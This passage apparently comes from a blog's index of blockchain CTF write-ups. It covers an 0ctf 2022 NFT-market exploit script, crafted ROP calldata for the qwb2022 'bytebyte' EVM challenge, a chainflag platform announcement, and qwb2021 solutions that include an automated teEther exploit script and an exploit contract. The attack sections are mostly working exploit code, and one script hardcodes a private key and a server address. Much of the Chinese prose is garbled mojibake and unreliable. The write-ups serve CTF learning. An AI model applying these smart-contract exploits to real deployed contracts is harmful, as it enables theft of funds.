w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), &apos;value&apos;: Web3.toWei(value, &apos;ether&apos;), &apos;data&apos;: data, &#125; return txndef sign_and_send(txn): signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print(&quot;txn_hash=&quot;, txn_hash) return txn_receiptdef deploy_eth(): compiled_sol = compile_files([&quot;eth.sol&quot;],output_values=[&quot;abi&quot;, &quot;bin&quot;],solc_version=&quot;0.8.15&quot;) data = compiled_sol[&apos;eth.sol:TctfMarket&apos;][&apos;bin&apos;] abi = compiled_sol[&apos;eth.sol:TctfMarket&apos;][&apos;abi&apos;] abi_TctfNFT = compiled_sol[&apos;eth.sol:TctfNFT&apos;][&apos;abi&apos;] txn = generate_tx(chain_id, &apos;&apos;, data, 0) txn_receipt = sign_and_send(txn) if txn_receipt[&apos;status&apos;] == 1: TctfMarket_address = txn_receipt[&apos;contractAddress&apos;] return TctfMarket_address,abi,abi_TctfNFT else: exit(0)def copy_attack(_TctfMarket): with open(&apos;attack_bk.sol&apos;, &apos;r&apos;) as f: ff = f.read() ff = ff.replace(&apos;0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45&apos; , _TctfMarket) ff = ff.replace(&apos;0x80C86B253647868C927dc8442143B880203BC397&apos; , public) with open(&apos;attack.sol&apos;, &apos;w&apos;) as g: g.write(ff)def deploy_attack(): compiled_sol = compile_files([&quot;attack.sol&quot;],output_values=[&quot;abi&quot;, &quot;bin&quot;],solc_version=&quot;0.8.15&quot;) data = compiled_sol[&apos;attack.sol:Attack&apos;][&apos;bin&apos;] txn = generate_tx(chain_id, &apos;&apos;, data, 0) txn_receipt = sign_and_send(txn) if txn_receipt[&apos;status&apos;] == 1: attack_address = txn_receipt[&apos;contractAddress&apos;] return attack_address else: exit(0)def deploy_AA(): compiled_sol = compile_files([&quot;attack.sol&quot;],output_values=[&quot;abi&quot;, &quot;bin&quot;],solc_version=&quot;0.8.15&quot;) data = compiled_sol[&apos;attack.sol:AA&apos;][&apos;bin&apos;] abi = compiled_sol[&apos;attack.sol:AA&apos;][&apos;abi&apos;] txn = generate_tx(chain_id, &apos;&apos;, data, 0) txn_receipt = sign_and_send(txn) if txn_receipt[&apos;status&apos;] == 1: AA_address = txn_receipt[&apos;contractAddress&apos;] return AA_address,abi else: exit(0)def rsv(_hash): signed_message = w3.eth.account.signHash(_hash, private) print(signed_message.messageHash.hex()) r = &apos;0x&apos;+signed_message.signature.hex()[2:66] s = &apos;0x&apos;+signed_message.signature.hex()[66:-2] v = &apos;0x&apos;+signed_message.signature.hex()[-2:] return r,s,vTctfMarket_address,abi,abi_TctfNFT = deploy_eth()print(&apos;TctfMarket_address =&apos;,TctfMarket_address)# TctfMarket_address = &quot;0x1d5f96A512a946c5C2A729f8155CCBb7bbBb3f3B&quot;contract = w3.eth.contract(abi = abi, address = TctfMarket_address)tctfNFT_address = contract.functions.tctfNFT().call()print(&apos;tctfNFT_address =&apos;,tctfNFT_address)tctfToken_address = contract.functions.tctfToken().call()print(&apos;tctfToken_address =&apos;,tctfToken_address)verifier_address = contract.functions.verifier().call()print(&apos;verifier_address =&apos;,verifier_address)TctfNFT_contract = w3.eth.contract(abi = abi_TctfNFT, address = tctfNFT_address)copy_attack(TctfMarket_address)attack_address = deploy_attack()print(&apos;attack_address =&apos;,attack_address)AA_address,abi = deploy_AA()print(&apos;AA_address =&apos;,AA_address)AA_contract = w3.eth.contract(abi = abi, address = AA_address)data = Web3.keccak(text=&apos;setinit(address,address,uint256,address,uint256,uint256)&apos;).hex()[:10]data += public[2:].rjust(64, &apos;0&apos;)data += attack_address[2:].rjust(64, &apos;0&apos;)data += &apos;1&apos;.rjust(64, &apos;0&apos;)data += attack_address[2:].rjust(64, &apos;0&apos;)data += &apos;1&apos;.rjust(64, &apos;0&apos;)data += &apos;3&apos;.rjust(64, &apos;0&apos;)txn = generate_tx(chain_id, Web3.toChecksumAddress(AA_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;setinit(eoa,attack_address,1,attack_address,1,3) success&apos;)else: exit(0)time.sleep(_time)hashl = AA_contract.functions.hashl().call()r,s,v = rsv(hashl)print(&apos;r =&apos;,r)print(&apos;s =&apos;,s)print(&apos;v =&apos;,v)data = Web3.keccak(text=&apos;attack1()&apos;).hex()[:10]txn = generate_tx(chain_id, Web3.toChecksumAddress(attack_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;attack1 success&apos;)else: exit(0)time.sleep(_time)data = Web3.keccak(text=&apos;airdrop()&apos;).hex()[:10]txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;airdrop() success&apos;)else: exit(0)time.sleep(_time)data = Web3.keccak(text=&apos;approve(address,uint256)&apos;).hex()[:10]data += TctfMarket_address[2:].rjust(64, &apos;0&apos;)data += &apos;2710&apos;.rjust(64, &apos;0&apos;)txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;approve(TctfMarket_address,10000) success&apos;)else: exit(0)time.sleep(_time)data = Web3.keccak(text=&apos;transfer(address,uint256)&apos;).hex()[:10]data += attack_address[2:].rjust(64, &apos;0&apos;)data += &apos;2&apos;.rjust(64, &apos;0&apos;)txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;transfer(attack_address,2) success&apos;)else: exit(0)time.sleep(_time)data = Web3.keccak(text=&apos;purchaseOrder(uint256)&apos;).hex()[:10]data += &apos;1&apos;.rjust(64, &apos;0&apos;)txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;purchaseOrder(1) success&apos;)else: exit(0)time.sleep(_time)data = Web3.keccak(text=&apos;createOrder(address,uint256,uint256)&apos;).hex()[:10]data += attack_address[2:].rjust(64, &apos;0&apos;)data += &apos;3&apos;.rjust(64, &apos;0&apos;)data += &apos;1&apos;.rjust(64, &apos;0&apos;)txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;createOrder(attack,3,1) success&apos;)else: exit(0)time.sleep(_time)data = Web3.keccak(text=&apos;purchaseOrder(uint256)&apos;).hex()[:10]data += &apos;0&apos;.rjust(64, &apos;0&apos;)txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;purchaseOrder(0) success&apos;)else: exit(0)time.sleep(_time)data = Web3.keccak(text=&apos;attackfor3(uint8,bytes32,bytes32)&apos;).hex()[:10]data += v[2:].rjust(64,&apos;0&apos;)data += r[2:].rjust(64,&apos;0&apos;)data += s[2:].rjust(64,&apos;0&apos;)txn = generate_tx(chain_id, Web3.toChecksumAddress(attack_address), data, 0)txn_receipt = sign_and_send(txn)# print(txn_receipt)if txn_receipt[&apos;status&apos;] == 1: print(&apos;attackfor3(v,r,s) success&apos;)else: exit(0)time.sleep(_time)data = Web3.keccak(text=&apos;attack4()&apos;).hex()[:10]txn = generate_tx(chain_id, Web3.toChecksumAddress(attack_address), data, 0)txn_receipt = sign_and_send(txn)if txn_receipt[&apos;status&apos;] == 1: print(&apos;attack4() success&apos;)else: exit(0)time.sleep(_time)print(&quot;EOA account&quot;,public)print(&quot;token1 owner:&quot;,TctfNFT_contract.functions.ownerOf(1).call())print(&quot;token2 owner:&quot;,TctfNFT_contract.functions.ownerOf(2).call())print(&quot;token3 owner:&quot;,TctfNFT_contract.functions.ownerOf(3).call())]]></content>
      <categories>
        <category>0ctf 2022</category>
      </categories>
      <tags>
        <tag>0ctf2022</tag>
        <tag>NFT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb2022 ç¬¬å…­å±Šå¼ºç½‘æ¯çº¿ä¸Šèµ›åŒºå—é“¾ bytebyte]]></title>
    <url>%2F2022%2Fbytebyte%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç¬¬å…­å±Š qwb çº¿ä¸‹èµ› bytebyte èµ›é¢˜ WP æ­å–œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å¸ˆå‚…ä¸€è¡€ è€ƒç‚¹æ˜¯ Return Oriented Programming revenge of EGMï¼Œå †æ ˆç»†èŠ‚å¯å‚è€ƒ https://hitcxy.com/2020/egm/ ç›¸æ¯”äºŽ EGM ï¼Œbytebyte è°ƒæ•´äº†å¾ªçŽ¯å˜é‡çš„ä½ç½®ï¼Œå¾ªçŽ¯å˜é‡æ˜¯ä¸ªèŒƒå›´ï¼ŒæŒ‰ç…§ä¸ªäººçš„æž„æ€ï¼Œå¦‚æžœ calldata é•¿åº¦æ˜¯ 4+32*11 å­—èŠ‚ï¼Œåˆ™è¿™ä¸ªå€¼æ˜¯å›ºå®šçš„ï¼Œå˜ç›¸è®©å¾ªçŽ¯å˜é‡èµ·åˆ°å›ºå®š canary çš„ä½œç”¨ï¼Œä¸è¿‡ä¹Ÿä¸èƒ½æŽ’é™¤æ›´çŸ­çš„ calldataï¼Œæ‰€ä»¥é¢˜ç›®è®¾è®¡æ˜¯æ¯”è¾ƒ calldata çš„æ•°å€¼å¤§å°ã€‚ Source16210000060405260043610610073576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638d715d9d1461024557806360fe47b11461031a5780636d4ce63c1461035557806335f4699414610372578063b4a99a4e1461038157610073565b610078565b600080fd600060006000600060005b61012061010052565b6101005190565b60206101005101806101005252565b6101005151602061010051036101005290565b61010052565b6100ca610100516100975b565b565b6100d66100a6565b6100de6100a6565b6100e7906100b9565b565b6100f1610087565b565b34156100cc57610078565b6101086000610097565b5b7f01000000000000000000000000000000000000000000000000000000000000006101005151602061010051035101510415610152575b60016101005151016101005152610109565b61015a6100a6565b6101626100a6565b506100ce565b6103916101406097565b5b6020610100510351610100515103156101d9577f0100000000000000000000000000000000000000000000000000000000000000610100515160606101005103510151046101005151604061010051035101535b60016101005151016101005152610391565b60006101005151604061010051035101535b60406101005151061561021c5760006101005151604061010051035101535b600161010051510161010051526101eb565b6102246100a6565b5061022d6100a6565b506102366100a6565b5061023f6100a6565b506100ce565b61024d6100e9565b6102576000610097565b610100516102656212345650565b36602462013000376102756100bf565b61028061034f610097565b61028c62013000610097565b61029534610097565b6102a160243603610097565b610168565b6102ae6100bf565b6102b96102c7610097565b6102c281610097565b6100fe565b6020610100510381602060408303526020820352602060208203510660208203510360200160400160408203f35b610100515160206101005103515561030b6100a6565b506103146100a6565b506100ce565b6103226100f3565b61032a6100bf565b61033561034f610097565b610340600435610097565b61034a6000610097565b6102f5565b60006000f35b61035d6100f3565b60005433146100785760005460805260206080f35b60665433141561007857606654ff5b6066543314156100785733606655005b604061010051035160206101005103510315610403577f0100000000000000000000000000000000000000000000000000000000000000604061010051035160606101005103510151046101005151604061010051035101535b60016040610100510351016040610100510352610391565b600061010051516040610100510351015360406040610100510351061561021c5760006101005151604061010051035101535b60016040610100510351016040610100510352610415565b505050505050505050505050505050505050505050505050505050505050505050505050505050 Analyse é¢˜ç›®ä¼šå°† calldata[24:] æ‹·è´åˆ° 0x140 ä½ç½®ï¼Œå…¶ä¸­ 0x9f æ˜¯å¾ªçŽ¯è®¡æ•°å™¨æ˜¯ä¸ªå˜é‡ï¼Œæ—¢è¦è¦†ç›– 0x2f5ï¼ˆè¿”å›žçš„æ ˆå¸§ä½ç½®ï¼‰ï¼Œåˆè¦æ»¡è¶³æ‹·è´çš„å¾ªçŽ¯æ­£å¸¸ç»ˆæ­¢ï¼Œæ‰€ä»¥æ˜¯ä¸ªèŒƒå›´å€¼ï¼Œæ‰€ä»¥é¢˜ç›®è®¾ç½®çš„æœ€å°çš„ calldata å¦‚ä¸‹ï¼ˆæ¯”è¾ƒå¤§å°ä¼šå°† msg.sender è®¾ç½®ä¸º0ï¼Œæ‰€ä»¥ä¸å½±å“ï¼‰ é¢˜ç›®è®¾ç½®çš„æœ€å°çš„ calldata å¦‚ä¸‹ 123456789101112data = &apos;0x8d715d9d&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000260&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;data += &apos;000000000000000000000000000000000000000000000000000000000000009f&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;000000000000000000000000000000000000000000000000000000000000034f&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000066&apos;data += &apos;000000000000000000000000715e68C887512022164b9f3F28439e9d12FFF5e1&apos; ä¸€è¡€é˜Ÿä¼çš„ calldata æ›´çŸ­æ›´å·§å¦™ï¼Œé€šè¿‡è®©å¾ªçŽ¯è®¡æ•°å™¨ i è¦†ç›–ä¸ºç»ˆæ­¢å€¼çš„æ–¹å¼ï¼Œä½¿å¾—å¾ªçŽ¯è®¡æ•°å™¨åŽé¢çš„æ•°æ®ä¸å†ä¼šè¢«ç”¨åˆ°ï¼Œæ‰€ä»¥ä¸éœ€è¦é¿å¼€å®ƒä»¬ï¼Œè¿™æ—¶åªè¦ä½¿ç”¨ 0x13000 ä¹‹åŽçš„ offset å°±å¯ä»¥è®© ROP æ­£å¸¸æ‰§è¡Œï¼ŒäºŽæ˜¯å¯ä»¥èŠ‚çº¦ä¸¤ä¸ªæ•°å¦‚ä¸‹ 12345678910data = &apos;0x8d715d9d&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000130e0&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000000ff&apos;data += &apos;000000000000000000000000000000000000000000000000000000000000034f&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000066&apos;data += &apos;0000000000000000000000000123456789012345678901234567890123456789&apos;]]></content>
      <categories>
        <category>qwb2022</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>qwb2022</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[chainflag]]></title>
    <url>%2F2021%2Fchainflag%2F</url>
    <content type="text"><![CDATA[æ¬¢è¿Žå…³æ³¨ chainflag å¹³å° Hello ðŸ‘€ ä¹‹å‰å’Œå„ä½å¸ˆå‚…ï¼ˆiczc tkmk syang ver PandaTea Soreat_u æŽ’åä¸åˆ†å…ˆåŽï¼‰æƒ³åˆ°çš„å»ºç«‹ä¸€ä¸ªå…³äºŽåŒºå—é“¾ CTF OJ çš„æƒ³æ³•ï¼ŒçŽ°åœ¨æˆ‘ä»¬çš„åŒºå—é“¾ CTF é¢˜ç›®è®­ç»ƒå¹³å°å·²ç»æ­£å¼ä¸Šçº¿äº† å¹³å°å·²ç»èƒ½åˆæ­¥ä½¿ç”¨ï¼ŒåŽç»­è¿˜ä¼šè¿›ä¸€æ­¥å®Œå–„ï¼Œå°ä¼™ä¼´å¯è¿›ç¾¤äº¤æµï¼Œå¦‚æžœäºŒç»´ç è¿‡æœŸå¤±æ•ˆï¼Œå¯è”ç³»æˆ‘è¿›ç¾¤å“¦ï¼Œå˜»å˜»å˜»å˜» å‘èµ·æƒ³æ³•ï¼šCTF ä¸­çš„å…·ä½“ç»†åˆ†æ–¹å‘æœ‰ pwnable.krã€reversing.krã€cryptohack ç­‰è®­ç»ƒå­¦ä¹ å¹³å°ï¼Œä½†åŒºå—é“¾ä½œä¸ºä¸€ä¸ªæ–°å…´æ–¹å‘è¿˜æ²¡æœ‰ä¸€ä¸ªç›¸åº”çš„å­¦ä¹ ç¤¾åŒºï¼ŒäºŽæ˜¯è®¾æƒ³æˆ‘ä»¬å»ºç«‹ä¸€ä¸ª github å¼€æºç»„ç»‡ï¼Œå®šä½æ˜¯å…³äºŽåŒºå—é“¾ CTF ä¸ŽåŒºå—é“¾å®‰å…¨ å¹³å°ä¸Šçš„é¢˜ç›®ä¼šåœ¨ https://github.com/chainflag/ctf-blockchain-challenges ä»¥å¼€æºçš„å½¢å¼è¿›è¡Œåä½œã€‚é™¤äº†è®­ç»ƒå¹³å°è¿˜æœ‰ä¸€äº›ä¸ŽåŒºå—é“¾CTF/åŒºå—é“¾å®‰å…¨ç›¸å…³çš„é¡¹ç›®åœ¨ https://github.com/chainflag ä¸‹å¼€æº]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>chainflag</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb2021 ç¬¬äº”å±Šå¼ºç½‘æ¯çº¿ä¸Šèµ›åŒºå—é“¾]]></title>
    <url>%2F2021%2Fqwb2021%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç¬¬äº”å±Š qwbï¼Œblockchains çš„ WPï¼Œå‹¿å–· éšæ—¶æ¬¢è¿Žå¤§å®¶æ¥äº¤æµï¼Œåˆ«å–·å°±å¥½ï¼Œè°¢è°¢ æ²¡æœ‰å®˜æ–¹ WP ï¼Œæˆ‘åªæ˜¯è‡ªå·±å†™ç€çŽ© é¢˜ç›®çŽ¯å¢ƒä¿ç•™åˆ° 2021 å¹´ 6 æœˆ 18 æ—¥ï¼Œæƒ³è¦éªŒè¯æµ‹è¯•çš„å°ä¼™ä¼´å¯ä»¥è‡ªè¡Œæµ‹è¯• BabyAEG è€ƒç‚¹ï¼šæ™ºèƒ½åˆçº¦è‡ªåŠ¨åŒ–æ¼æ´žåˆ©ç”¨ ä¸ºäº†è®©ä¸çŸ¥é“ AEG çš„å°ä¼™ä¼´ä¹Ÿèƒ½åšå‡ºæ¥ï¼Œå°±æ²¡æœ‰è®¾ç½®é‚£ä¹ˆå¤šæ¨¡å¼åŠå¤æ‚çš„æ¨¡å¼ï¼Œå¦‚æžœä½ æ„¿æ„æ¨¡å¼åŒ¹é…ï¼ŒèŠ±æ—¶é—´ä¹Ÿæ˜¯å¯ä»¥åšçš„ çœ‹äº† WP ï¼Œæ‰€æœ‰é˜Ÿä¼éƒ½æ˜¯æ¨¡å¼åŒ¹é…åšçš„ï¼Œè¿™é‡Œä¸ä»‹ç»æ¨¡å¼åŒ¹é…è§£æ³• å‚è€ƒ teEther: Gnawing at Ethereum to Automatically Exploit Smart Contractsï¼Œè®ºæ–‡å‘è¡¨äºŽ 27th USENIX Security Symposium (Usenix Security 18) å…·ä½“å‚è€ƒè„šæœ¬ï¼Œä¸å…·ä½“åˆ†æžäº†ï¼Œæƒ³è¦æ·±å…¥äº†è§£çš„å¯ä»¥ç ”è¯»æ–‡ç« ï¼ˆé€ƒ XD EXP å®Œå…¨è‡ªåŠ¨åŒ–è„šæœ¬ï¼Œä¹Ÿä¸ç”¨å•ç‹¬åŽ»ç”³è¯· EOA è´¦æˆ·çš„ Ether 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180from pwn import *import re,hashlib,random,stringfrom web3 import Web3, HTTPProviderfrom teether.exploit import combined_exploitfrom teether.project import Projectimport time,requestsw3 = Web3(Web3.HTTPProvider("http://8.140.174.230:8545"))private = "f35bd686fe298c6b1f1f50d4db33f0e65cef843573e0e52303ef22219a9fe95c"public = "0x52cC2403764380CCa583633d2523999FE5077113"# context.log_level=Truecontext.terminal = ["deepin-terminal","-x","sh","-c"]remote_addr=['8.140.174.230', 10001]p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =""): gdb.attach(io , b) raw_input()def lg(s): log.info('\033[1;31;40m %s' % (s))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))def passpow(): rud('Firstly, please give me the proof of your work in 20 seconds!\n') s = rl().decode('utf-8') print(s) prefix = re.split('\(', s)[1][:8] print(prefix) difficulty = 20 print(difficulty) while 1: answer=''.join(random.choice(string.ascii_letters + string.digits) for i in range(8)) bits=bin(int(hashlib.sha256((prefix+answer).encode()).hexdigest(),16))[2:] if bits.endswith('0'*difficulty): print(answer) sl(answer) returndef challenge(): rud('[+] Challenge') lg(rl().decode('utf-8')) # lg(rl().decode('utf-8')) rud('[+] Transaction hash for deploying contract:') deploy_contract_tx = rl().decode('utf-8').strip() # lg(deploy_contract_tx) contract_address = w3.eth.get_transaction_receipt(deploy_contract_tx)['contractAddress'] # lg(contract_address) bytecode = w3.eth.get_code(Web3.toChecksumAddress(contract_address)) # lg(bytecode.hex()) return contract_address, bytecodedef generate_tx(chainID, to, data, value): if(type(to) is int): to = '0x'+hex(to)[2:].rjust(40,'0') txn = &#123; 'chainId': chainID, 'from': Web3.toChecksumAddress(public), 'to': Web3.toChecksumAddress(to), 'gasPrice': w3.eth.gasPrice, 'gas': 3000000, 'nonce': w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), 'value': Web3.toWei(value, 'ether'), 'data': data, &#125; return txndef sign_and_send(txn): signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) # print("txn_hash=", txn_hash) return txn_hash, txn_receiptdef main(bytecode, target_addr, shellcode_addr, amount, savefile=None, initial_storage_file=None, initial_balance=None, flags=None): p = Project(bytecode) amount_check = '+' amount = amount if amount[0] in ('=', '+', '-'): amount_check = amount[0] amount = amount[1:] amount = int(amount) initial_storage = dict() if initial_storage_file: with open(initial_storage_file, 'rb') as f: initial_storage = &#123;int(k, 16): int(v, 16) for k, v in json.load(f).items()&#125; flags = flags or &#123;'CALL', 'CALLCODE', 'DELEGATECALL', 'SELFDESTRUCT'&#125; result = combined_exploit(p, int(target_addr, 16), int(shellcode_addr, 16), amount, amount_check, initial_storage, initial_balance, flags=flags) if result: call, r, model = result for c in call: if c['caller'] == c['origin']: data = "0x" + c.get('payload', b'').hex() to = shellcode_addr value = c['value'] # print(value) # print(w3.eth.gasPrice) if(value != 0): value = 3 txn = generate_tx(8888, to, data, value) txn_hash, txn_receipt = sign_and_send(txn) # print(txn_hash) # print(txn_receipt) time.sleep(2) else: data = "0x" + c.get('payload', b'').hex() to = c['caller'] value = c['value'] # print(value) if(value != 0): value = 3 txn = generate_tx(8888, to, data, value) txn_hash, txn_receipt = sign_and_send(txn) # print(txn_hash) # print(txn_receipt) time.sleep(2) return True, txn_hash return False, ""if __name__ == '__main__': passpow() count = 0 rud('[+] Your EOA account:') address = rl().decode().strip('').strip('\n') lg(address) rud('Whether your EOA account has enough eth?(y or n): ') res = requests.post(url='http://8.140.174.230/api/',json=&#123;'address': address&#125;,headers=&#123;'Content-Type':'application/json'&#125;) if(res.status_code == 200): time.sleep(3) sl('y') while 1: contract_address, bytecode = challenge() solved, txn_hash = main(bytecode, public, contract_address, "-1000") if solved: sla("[-] Input your txhash that empty contract's balance: ", txn_hash) lg(rl().decode('utf-8')) count += 1 if count == 25: sla("[-] input your team token: ", 'icq12345678900987654321123456789') rud("[+] flag:") lg(rl().strip().decode()) break # pi() Result OneGadget ä¸€é”®é€šå…³ï¼Œåå­—å¯èƒ½ç¨æœ‰ä¸æ°ï¼Œä¸è¦ä»‹æ„ é¢˜ç›®ä¸éš¾ï¼Œæ¯”è¾ƒç®€å•ï¼Œç®€ç§°å¥—å¨ƒåˆçº¦ ðŸ¶ ï¼Œé€†å‘åˆ†æžå‡ºé€»è¾‘å…³ç³»å³å¯ ä¸€ä¸ª payload é€šå…³æ‰€æœ‰åˆçº¦å…³å¡å³å¯ Source æ”¾å‡ºæºç ï¼Œä¸å†ä½œåˆ†æž 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394pragma solidity 0.4.24;contract Level &#123; Level public next; constructor(Level next_) public &#123; next = next_; &#125; function GetSelector() public view returns (bytes4); modifier _() &#123; _; assembly &#123; let next := sload(next_slot) if iszero(next) &#123; return(0, 0) &#125; mstore(0x00, 0x7432214c00000000000000000000000000000000000000000000000000000000) pop(call(gas(), next, 0, 0, 0x04, 0x00, 0x04)) calldatacopy(0x04, 0x04, sub(calldatasize(), 0x04)) switch call(gas(), next, 0, 0, calldatasize(), 0, 0) case 0 &#123; returndatacopy(0x00, 0x00, returndatasize()) revert(0x00, returndatasize()) &#125; case 1 &#123; returndatacopy(0x00, 0x00, returndatasize()) return(0x00, returndatasize()) &#125; &#125; &#125;&#125;contract OneGadget is Level &#123; constructor() public Level(new Level1()) &#123;&#125; function GetSelector() public view returns (bytes4) &#123; return this.solve.selector; &#125; bool public solved; function solve(uint8 v, bytes32 r, bytes32 s) public _ &#123; require(ecrecover(keccak256(&quot;solved&quot;), v, r, s) == 0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF); solved = true; &#125;&#125;contract Level1 is Level &#123; constructor() public Level(new Level2()) &#123;&#125; function GetSelector() public view returns (bytes4) &#123; return this.solve.selector; &#125; function solve(bytes20 guess) public _ &#123; require(guess == bytes20(blockhash(block.number - 1))); &#125;&#125;contract Level2 is Level &#123; constructor() public Level(new Level3()) &#123;&#125; function GetSelector() public view returns (bytes4) &#123; return this.solve.selector; &#125; function solve(uint16 a, uint16 b) public _ &#123; require(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; a + b &lt; a); &#125;&#125;contract Level3 is Level &#123; constructor() public Level(new Level4()) &#123;&#125; function GetSelector() public view returns (bytes4) &#123; return this.solve.selector; &#125; function solve(uint idx, uint[4] memory keys, uint[4] memory lock) public _ &#123; require(keys[idx % 4] == lock[idx % 4]); require(keys[2] - keys[3] == keys[0] - keys[1]); for (uint j = 0; j &lt; keys.length; j++) &#123; require((keys[j] - lock[j]) % 2 == 0); &#125; &#125;&#125;contract Level4 is Level &#123; constructor() public Level(Level(0x00)) &#123;&#125; function GetSelector() public view returns (bytes4) &#123; return this.solve.selector; &#125; function solve(bytes32[6] choices, uint choice) public _ &#123; require(choices[choice % 6] == keccak256(&quot;choose&quot;)); &#125;&#125; EXP è‡ªè¡Œéƒ¨ç½² 12345678910111213141516171819202122232425contract Exploit &#123; constructor(OneGadget entry) public &#123; bytes memory payload = abi.encodePacked( entry.solve.selector, uint256(uint16(0xff1b) | uint256(bytes32(bytes20(blockhash(block.number - 1))))), bytes32(0x3ec07bbb0fe7fd6e6d2abbb5f0a0c9947173da8daa5265f6231beea212772585), bytes32(0x26236f50af44e91e608d5946b411a4f86a83ace0543bf8efca7bee233d1f98db), bytes32(keccak256(&quot;choose&quot;)), bytes32(0xc9649d0f469c55d93b24b07c82444ac17ec3287c850f72d2eb7d55ab47151bec), bytes32(0x3ec07bbb0fe7fd6e6d2abbb5f0a0c9947173da8daa5265f6231beea212772585), bytes32(uint(3)), bytes32(keccak256(&quot;choose&quot;)), bytes32(0xc9649d0f469c55d93b24b07c82444ac17ec3287c850f72d2eb7d55ab47151bec) ); assembly &#123; switch call(gas(), entry, 0, add(payload, 0x20), 292, 0, 0) case 0 &#123; returndatacopy(0x00, 0x00, returndatasize()) revert(0x00, returndatasize()) &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>qwb2021</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>qwb2021</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF FINAL 2021 FlyToMoon]]></title>
    <url>%2F2021%2Fxctf-final-2021%2F</url>
